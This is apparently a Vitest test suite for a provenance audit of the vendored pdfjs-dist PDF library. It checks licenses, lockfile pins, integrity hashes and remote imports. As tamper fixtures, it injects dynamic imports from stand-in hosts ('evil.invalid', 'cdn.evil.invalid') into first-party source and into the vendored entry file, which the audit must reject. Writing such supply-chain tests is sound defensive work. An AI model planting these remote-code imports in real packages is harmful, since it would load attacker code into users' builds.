import { mkdtempSync, mkdirSync, readFileSync, writeFileSync, copyFileSync, rmSync } from "node:fs";
import { tmpdir } from "node:os";
import { join, resolve } from "node:path";
import { afterAll, beforeAll, describe, expect, it } from "vitest";
import {
  inspectPdfEngineProvenance369, auditInstalledPdfEngine369,
} from "../scripts/audit-pdf-engine-provenance-369";

const project = resolve(import.meta.dirname, "..");
let temp = "";
const clones: string[] = [];
const fixtures = [
  "build/pdf.mjs", "build/pdf.worker.mjs", "legacy/build/pdf.mjs",
  "LICENSE", "package.json",
  "wasm/jbig2.wasm", "wasm/openjpeg.wasm", "wasm/qcms_bg.wasm", "wasm/quickjs-eval.wasm",
  "wasm/LICENSE_JBIG2", "wasm/LICENSE_QCMS", "wasm/LICENSE_PDFJS_JBIG2",
  "wasm/LICENSE_OPENJPEG", "wasm/LICENSE_PDFJS_OPENJPEG", "wasm/LICENSE_PDFJS_QCMS",
  "standard_fonts/LICENSE_LIBERATION", "standard_fonts/LICENSE_FOXIT", "cmaps/LICENSE",
];

function fakeProject(): string {
  const dir = join(temp, String(clones.length));
  clones.push(dir);
  mkdirSync(join(dir, "node_modules", "pdfjs-dist"), { recursive: true });
  mkdirSync(join(dir, "src", "engines", "pdf"), { recursive: true });
  for (const file of fixtures) {
    const target = join(dir, "node_modules", "pdfjs-dist", file);
    mkdirSync(resolve(target, ".."), { recursive: true });
    copyFileSync(join(project, "node_modules", "pdfjs-dist", file), target);
  }
  writeFileSync(join(dir, "package.json"), JSON.stringify({
    dependencies: { "pdfjs-dist": "^6.4.299" },
  }));
  writeFileSync(join(dir, "package-lock.json"), JSON.stringify({
    packages: {
      "node_modules/pdfjs-dist": {
        ...JSON.parse(readFileSync(join(project, "package-lock.json"), "utf8")).packages["node_modules/pdfjs-dist"],
      },
    },
  }));
  writeFileSync(join(dir, "src", "engines", "pdf", "tool.ts"),
    'export async function run() { return import("pdfjs-dist"); }\n');
  return dir;
}

function file(root: string, relative: string): string { return join(root, relative); }

beforeAll(() => { temp = mkdtempSync(join(tmpdir(), "stru369-audit-")); });
afterAll(() => { if (temp) rmSync(temp, { recursive: true, force: true }); });

describe("#369 execution-backed installed PDF vendor provenance gate", () => {
  it("independently opens the actual repository PDF fixture through installed PDF.js and fingerprints real artifacts", async () => {
    const evidence = await auditInstalledPdfEngine369(project);
    expect(evidence.inspection.identity).toEqual({
      packageName: "pdfjs-dist", version: "6.4.299", declaredLicense: "Apache-2.0",
    });
    expect(evidence.inspection.integrity.lockResolution).toMatch(/^https:\/\/registry\.npmjs\.org\/pdfjs-dist\//u);
    expect(evidence.inspection.integrity.tarballSha512Attested).toBe(false);
    expect(evidence.inspection.assets.every((entry) => /^[a-f0-9]{64}$/u.test(entry.sha256))).toBe(true);
    expect(evidence.inspection.assets.some((entry) => entry.path === "build/pdf.worker.mjs" && entry.bytes > 100_000)).toBe(true);
    expect(evidence.inspection.imports.remoteCount).toBe(0);
    expect(evidence.probe.fixturePageCount).toBe(2);
    expect(evidence.probe.extractedText).toMatch(/alpha|beta/iu);
    expect(evidence.probe.fixtureSha256).toMatch(/^[a-f0-9]{64}$/u);
    expect(evidence.probe.roundTrip).toMatchObject({
      operation: "ADD_VISIBLE_TEXT_OVERLAY_PAGE_1", pageCount: 2,
      firstPageText: expect.stringMatching(/alpha.*STR369_OVERLAY/u),
      untouchedPageText: "beta", independentReader: "pdfjs-dist/legacy", verdict: "PASS",
    });
    expect(evidence.probe.roundTrip.originalSha256).toBe(evidence.probe.fixtureSha256);
    expect(evidence.probe.roundTrip.outputSha256).toMatch(/^[a-f0-9]{64}$/u);
    expect(evidence.probe.roundTrip.outputSha256).not.toBe(evidence.probe.roundTrip.originalSha256);
    expect(evidence.adoption).toBe("NO_ADOPT_NO_GOLD");
    expect(evidence.comparison.some((r) => r.engine === "MuPDF" && r.installed === false && r.licenseGate === "AGPL_OR_COMMERCIAL_UNAPPROVED")).toBe(true);
    expect(evidence.comparison.some((r) => r.engine === "in-house PDF parser/writer" && r.installed)).toBe(true);
    expect(evidence.comparison.map((row) => row.engine)).toEqual([
      "in-house PDF parser/writer", "Mozilla PDF.js", "pdfstudio / qpdf WASM",
      "pdf-lib", "@cantoo/pdf-lib (feasibility)", "MuPDF", "macOS PDFKit",
    ]);
    expect(evidence.comparison.every((row) => row.checkedAt === "2026-10-19"
      && row.source.length > 0 && row.licenseSource.length > 0
      && row.browserBundle.length > 0 && row.mobileEvidence.length > 0
      && row.unsupported.length > 0)).toBe(true);
    expect(evidence.comparison.find((r) => r.engine === "in-house PDF parser/writer")?.decision).toBe("KEEP_SCOPED");
    expect(evidence.comparison.find((r) => r.engine === "Mozilla PDF.js")?.decision).toBe("RENDER_ONLY");
    expect(evidence.comparison.find((r) => r.engine === "MuPDF")).toMatchObject({
      installed: false, licenseGate: "AGPL_OR_COMMERCIAL_UNAPPROVED", decision: "NO_ADOPT",
      mobileEvidence: "NOT_RUN",
    });
    expect(evidence.comparison.find((r) => r.engine === "pdfstudio / qpdf WASM"))
      .toMatchObject({ installed: false, decision: "NOT_APPLICABLE", browserBundle: expect.stringContaining("0B") });
    expect(evidence.comparison.find((r) => r.engine === "pdf-lib")).toMatchObject({
      installed: false, decision: "NO_ADOPT",
    });
  }, 20_000);

  it("admits unchanged bounded local vendor evidence but never claims transitive legal clearance", () => {
    const evidence = inspectPdfEngineProvenance369(fakeProject());
    expect(evidence.identity.declaredLicense).toBe("Apache-2.0");
    expect(evidence.integrity.lockAndInstallAgree).toBe(true);
    expect(evidence.integrity.tarballSha512Attested).toBe(false);
    expect(evidence.imports.remoteCount).toBe(0);
    expect(evidence.assets.length).toBeGreaterThanOrEqual(7);
    expect(evidence.licenseNotices.length).toBeGreaterThan(8);
  }, 20_000);

  it("refuses false proprietary-safe licensing if vendor manifest is changed to AGPL", () => {
    const root = fakeProject();
    const target = file(root, "node_modules/pdfjs-dist/package.json");
    const manifest = JSON.parse(readFileSync(target, "utf8")) as Record<string, unknown>;
    manifest.license = "AGPL-3.0-only";
    writeFileSync(target, JSON.stringify(manifest));
    expect(() => inspectPdfEngineProvenance369(root)).toThrow(/PDF369_NO_GO.*(?:AGPL|license)/iu);
  });

  it("refuses a tampered/absent root license even if package.json still says Apache-2.0", () => {
    const root = fakeProject();
    writeFileSync(file(root, "node_modules/pdfjs-dist/LICENSE"), "Proprietary commercial evaluation only.");
    expect(() => inspectPdfEngineProvenance369(root)).toThrow(/PDF369_NO_GO.*license/iu);
  });

  it("refuses a changed lock pin, integrity declaration or vendor artifact signature", () => {
    const root = fakeProject();
    const target = file(root, "package-lock.json");
    const lock = JSON.parse(readFileSync(target, "utf8")) as { packages: Record<string, Record<string, string>> };
    lock.packages["node_modules/pdfjs-dist"]!.version = "6.4.300";
    writeFileSync(target, JSON.stringify(lock));
    expect(() => inspectPdfEngineProvenance369(root)).toThrow(/PDF369_NO_GO.*(?:version|lock)/iu);

    const root2 = fakeProject();
    const integrityPath = file(root2, "package-lock.json");
    const altered = JSON.parse(readFileSync(integrityPath, "utf8")) as { packages: Record<string, Record<string, string>> };
    altered.packages["node_modules/pdfjs-dist"]!.integrity = "sha512-fake";
    writeFileSync(integrityPath, JSON.stringify(altered));
    expect(() => inspectPdfEngineProvenance369(root2)).toThrow(/PDF369_NO_GO.*integrity/iu);

    const root3 = fakeProject();
    writeFileSync(file(root3, "node_modules/pdfjs-dist/build/pdf.worker.mjs"), "");
    expect(() => inspectPdfEngineProvenance369(root3)).toThrow(/PDF369_NO_GO.*(?:artifact|worker|header)/iu);
  });

  it("refuses browser remote imports in first-party PDF source and in installed vendor entrypoint", () => {
    const root = fakeProject();
    writeFileSync(file(root, "src/engines/pdf/tool.ts"), 'export const donor = import("https://evil.invalid/pdf.mjs");\n');
    expect(() => inspectPdfEngineProvenance369(root)).toThrow(/PDF369_NO_GO.*remote/u);

    const root2 = fakeProject();
    const target = file(root2, "node_modules/pdfjs-dist/build/pdf.mjs");
    writeFileSync(target, readFileSync(target, "utf8") + '\nimport("https://cdn.evil.invalid/renderer.mjs");\n');
    expect(() => inspectPdfEngineProvenance369(root2)).toThrow(/PDF369_NO_GO.*remote/u);
  });

  it("refuses an unlicensed WASM carrier rather than treating root Apache notice as all-assets permission", () => {
    const root = fakeProject();
    writeFileSync(file(root, "node_modules/pdfjs-dist/wasm/LICENSE_OPENJPEG"), "");
    expect(() => inspectPdfEngineProvenance369(root)).toThrow(/PDF369_NO_GO.*(?:license|notice)/iu);
  });

  it("refuses substitution with a plausible-length AGPL notice, not just an empty notice", () => {
    const root = fakeProject();
    writeFileSync(file(root, "node_modules/pdfjs-dist/wasm/LICENSE_OPENJPEG"),
      "AGPL-3.0-only; commercial redistribution denied. ".repeat(12));
    expect(() => inspectPdfEngineProvenance369(root)).toThrow(/PDF369_NO_GO.*(?:license|notice|AGPL)/iu);
  });
});
